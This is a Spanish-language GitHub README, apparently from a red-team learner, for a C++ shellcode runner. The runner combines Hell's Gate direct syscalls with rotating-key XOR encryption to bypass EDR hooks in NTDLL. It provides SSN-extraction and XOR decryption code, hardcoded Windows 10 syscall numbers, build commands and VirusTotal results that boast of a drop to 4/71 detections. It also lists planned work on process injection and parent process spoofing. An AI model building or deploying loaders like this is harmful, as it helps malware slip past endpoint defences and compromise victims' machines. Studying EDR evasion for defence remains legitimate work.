# hells-gate-runner

> Shellcode runner en C++ usando syscalls directas (Hell's Gate) + cifrado XOR.  
> Bypasea los hooks de NTDLL que usan los EDR. **4/71 en VirusTotal.**

## Qué es esto

Un shellcode runner que evita las APIs monitoreadas de Windows llamando directamente
al kernel via syscalls, sin pasar por NTDLL donde los EDR ponen sus hooks.
Combina Hell's Gate para obtener los SSNs dinámicamente con cifrado XOR para
evadir detección estática por firma.

Desarrollado como parte del estudio de Red Team y evasión de EDR en Windows.

## Cómo funciona

```
shellcode XOR cifrado en el binario
        ↓
xor_decrypt en runtime → descifra en memoria
        ↓
NtAllocateVirtualMemory → sin pasar por VirtualAlloc     (EDR no puede hookear)
        ↓
NtWriteVirtualMemory    → sin pasar por memcpy           (EDR no puede hookear)
        ↓
NtProtectVirtualMemory  → sin pasar por VirtualProtect   (EDR no puede hookear)
        ↓
NtCreateThreadEx        → sin pasar por CreateThread     (EDR no puede hookear)
```

## Hell's Gate — obtener el SSN dinámicamente

Cada función de NTDLL tiene un número de syscall (SSN) único. El stub de cada
función en NTDLL tiene este patrón de bytes:

```
4C 8B D1    mov r10, rcx    ; primer argumento
B8 XX 00    mov eax, XX     ; XX = SSN
0F 05       syscall
C3          ret
```

Hell's Gate lee esos bytes en memoria y extrae el SSN:

```cpp
WORD GetSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE   pFunc  = (PBYTE)GetProcAddress(hNtdll, functionName);

    if (!pFunc) return 0;

    // verificar patron del stub sin hook
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(WORD*)(pFunc + 4);   // SSN en bytes 4 y 5
    }
    return 0;  // patron no coincide → funcion hookeada
}
```

SSNs en Windows 10 22H2 x64:

```
NtAllocateVirtualMemory  → 0x18
NtWriteVirtualMemory     → 0x3A
NtProtectVirtualMemory   → 0x50
NtCreateThreadEx         → 0xC2
```

## El stub de syscall (NASM)

El stub ejecuta la syscall directamente sin pasar por NTDLL.
El SSN se guarda en una variable global `g_ssn` antes de cada llamada
porque pasarlo como argumento desplazaría los demás argumentos de la syscall.

**Por qué no hay `sub rsp` / `add rsp`:**
El llamador (C++) es responsable del stack en Windows x64. Si el stub mueve RSP,
los argumentos extra (5to, 6to) que el llamador dejó en el stack se pierden.

## XOR — cifrado del shellcode

El shellcode viaja cifrado en el binario para romper detección por firma estática.
Se descifra en memoria en runtime antes de ejecutarse.

```cpp
void xorDecrypt(unsigned char* data, size_t size, const std::string& key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.size()];
    }
}
```

Clave rotativa — cada byte del shellcode se xorea con un byte distinto de la clave,
lo que dificulta el análisis estático comparado con XOR de un solo byte.

## Compilar

```cmd
# 1. ensamblar el stub
nasm -f win64 syscall_stub.asm -o syscall_stub.obj

# con ruta completa si nasm no esta en PATH
C:\msys64\usr\bin\nasm.exe -f win64 syscall_stub.asm -o syscall_stub.obj

# 2. compilar y linkear
g++ -m64 runner.cpp syscall_stub.obj -o runner.exe -lkernel32
```

## Resultados VirusTotal

| Version | Detecciones |
| sin evasion | 13/69 |
https://www.virustotal.com/gui/file/2a3f871bc59a606c755815c2aa586896be19726155695f2a4ac4e20e44af32f6

| XOR encryption | 4/71 |
https://www.virustotal.com/gui/file/5442ef86a0ec6372e04e838a0c788463b4633d787dda476fa671c393a935a6b8

Los 4 restantes detectan por analisis heuristico del PE compilado con MinGW,
no por el shellcode ni el comportamiento en runtime.

## Superficie de deteccion — lo que todavia te delata

```
PE compilado con MinGW      → headers reconocibles, heuristicas de AV
Sin code signing            → binario sin firma digital hace que salte SmartScreen
Sin NTDLL unhooking         → si el EDR hookeo antes de que corras va a fallar
Sin process injection       → corre en tu propio proceso, mas facil de monitorear
```

Proximas mejoras:
- NTDLL unhooking desde disco
- Halo's Gate para funciones hookeadas
- Process injection en proceso legitimo
- Parent process spoofing

## Disclaimer

Publicado con fines **exclusivamente educativos** es solo para entender como funcionan
las syscalls directas y la evasion de EDR a nivel de API de Windows.

No uses estas tecnicas contra sistemas que no sean tuyos o sobre los que
no tenes autorizacion escrita explicita.

## Autor

Ezequiel Litre — [LinkedIn](https://www.linkedin.com/in/ezequiel-litre)  
eJPTv2 · HTB Professional (Lvl 50) · Red Team development  
HTB: [Segaotava](https://app.hackthebox.com/users/2040680)
